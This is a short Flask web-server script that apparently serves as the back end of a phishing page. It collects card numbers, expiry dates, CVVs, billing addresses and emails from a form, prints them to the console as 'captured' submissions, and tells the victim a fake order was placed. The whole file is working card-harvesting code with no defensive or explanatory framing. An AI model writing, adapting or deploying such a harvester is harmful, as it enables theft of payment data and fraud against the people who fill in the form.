from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        card_number = request.form.get("card")
        expiry = request.form.get("expiry")
        cvv = request.form.get("cvv")
        address = request.form.get("address")
        email = request.form.get("email")

        print("\n[+] New Submission Captured:")
        print(f"Email: {email}")
        print(f"Card Number: {card_number}")
        print(f"Expiry Date: {expiry}")
        print(f"CVV: {cvv}")
        print(f"Address: {address}")
        
        return "✅ Order Submitted. Thank you!"

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

